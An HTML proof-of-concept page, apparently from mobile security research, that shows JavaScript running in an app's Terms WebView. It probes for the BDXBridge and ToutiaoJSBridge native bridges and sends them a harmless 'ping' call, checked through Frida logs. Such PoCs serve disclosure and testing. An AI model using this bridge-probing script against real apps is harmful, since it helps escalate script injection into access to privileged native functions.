<!doctype html>
<html>
  <head>
    <meta charset="utf-8">
    <title>GAUTH XSS POC</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
      html, body {
        margin: 0;
        padding: 0;
        width: 100%;
        height: 100%;
        font-family: sans-serif;
        background: #f5f5f5;
      }
      .wrap {
        padding: 24px;
      }
      h1 {
        font-size: 24px;
        margin-bottom: 12px;
      }
      p {
        font-size: 16px;
      }
      button {
        display: block;
        margin-top: 24px;
        padding: 14px 20px;
        font-size: 18px;
        width: 100%;
      }
    </style>
  </head>
  <body>
    <div class="wrap">
      <h1>GAUTH XSS POC</h1>
      <p>If you see this inside the app, JS is running in the Terms WebView.</p>

      <button onclick="testBridge()">TEST NATIVE BRIDGE</button>
      <p style="font-size:14px;color:#555;">
        After pressing, check Frida logs for JSB2Impl.invokeMethod().
      </p>
    </div>

    <script>
      alert("WebView controlled");

      setTimeout(function () {
        var msg = [];
        if (window.BDXBridge) msg.push("BDXBridge");
        if (window.ToutiaoJSBridge) msg.push("ToutiaoJSBridge");
        alert("Available bridges: " + (msg.join(", ") || "none"));
      }, 1000);

      function testBridge() {
        try {
          var payload = {
            "__callback_id": "1",
            "__msg_type": "call",
            "func": "ping",
            "params": { from: "gauth-xss-poc" }
          };

          if (window.ToutiaoJSBridge && ToutiaoJSBridge.invokeMethod) {
            ToutiaoJSBridge.invokeMethod(JSON.stringify(payload));
            alert("Sent ToutiaoJSBridge.invokeMethod()");
          } else if (window.BDXBridge && BDXBridge._invokeMethod) {
            BDXBridge._invokeMethod(JSON.stringify(payload));
            alert("Sent BDXBridge._invokeMethod()");
          } else {
            alert("No bridge method available");
          }
        } catch (e) {
          alert("Bridge error: " + e);
        }
      }
    </script>
  </body>
</html>
